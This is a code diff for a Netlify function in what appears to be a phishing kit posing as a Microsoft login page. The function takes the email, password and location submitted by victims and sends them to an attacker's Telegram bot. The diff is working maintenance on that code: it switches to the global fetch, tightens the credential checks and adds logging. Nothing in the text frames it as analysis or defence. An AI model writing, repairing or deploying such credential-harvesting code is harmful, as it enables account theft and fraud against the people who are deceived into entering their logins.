@@ -1,5 +1,3 @@
-const fetch = require('node-fetch');
-
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') {
         return { statusCode: 405, body: 'Method Not Allowed' };
@@ -11,7 +9,10 @@ exports.handler = async (event) => {
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-        // Format message for Telegram WITH LOCATION
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            throw new Error('Missing Telegram credentials');
+        }
+
         let message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
         
         if (location && location.country !== 'Unknown') {
@@ -25,14 +26,12 @@ exports.handler = async (event) => {
         
         message += `\n\nFrom: Microsoft Login Page (Netlify)`;
         
-        // Send to Telegram
-        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-            });
-        }
+        // Use global fetch (available in Netlify Functions)
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
 
         return {
             statusCode: 200,
@@ -42,6 +41,7 @@ exports.handler = async (event) => {
             })
         };
     } catch (error) {
+        console.error('Error:', error);
         return {
             statusCode: 200,
             body: JSON.stringify({ 
